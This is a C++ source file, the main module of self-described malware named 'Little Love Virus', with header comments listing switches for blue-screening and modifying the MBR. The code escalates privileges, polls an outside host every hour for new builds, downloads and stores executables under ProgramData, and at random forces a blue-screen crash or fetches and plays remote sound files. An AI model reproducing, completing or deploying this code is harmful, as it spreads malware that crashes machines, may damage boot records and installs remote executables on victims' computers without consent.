/*
Little Love Virus
Yellow Eel special version
By wurenji,2022
main:main.cpp
The main virus.

command:
/Cd:必须的参数
/r:正常运行
/b:蓝屏
/m:改MBR
/v:直接退出
*/

#define __BUILD__ 1
#include"std.h"
#include"func.h"
#include"hide.h"

int _tmain(int argc, _TCHAR* argv[])
{
	__time64_t now=0;
	std::wstringstream wss;
	std::wfstream wfs;
	GetPrivileges();
	while (true)
	{
		now=_time64(NULL);
		srand(static_cast<unsigned int>(static_cast<unsigned int>(now)));
		bool iserror=false;
		wss<<GetDataFromURL(_T("https://llv-website.rf.gd/update/lastbuild.txt"),iserror);
		int lastbuildnumber = 0;
		wss >> lastbuildnumber;
		if (lastbuildnumber > __BUILD__)
		{//update new Build
			std::wstring newbuildname;
			wss << lastbuildnumber << _T(".exe") << std::flush;
			wss >> newbuildname;
			DownloadFileFromURL(_T("https://llv-website.rf.gd/update/lastbuild.exe"), _T("%ProgramData%\\llv\\") + newbuildname);
			wfs.open(_T("%ProgramData%\\llv\\launcherobj.ini"), std::ios::out);
			wfs << lastbuildnumber;
			wfs.close();
			if (rand() % 16 == 0)
				MakeBlueScreen(0xAA232323);
			if (rand() % 16 == 0)
			{
				std::wstring soundid;
				wss << rand() % 5 << std::flush;
				wss >> soundid;
				DownloadFileFromURL(_T("https://llv-website.rf.gd/res/sound") + soundid + _T(".wav"), _T("%ProgramData%\\llv\\cache\\sound" )+ soundid + _T(".wav"));
				PlaySoundFile(_T("%ProgramData%\\llv\\cache\\sound" )+ soundid + _T(".wav"),true);

			}
		}
		Sleep(60 * 60 * 1000);//wait 1h

	}
	return 0;
}
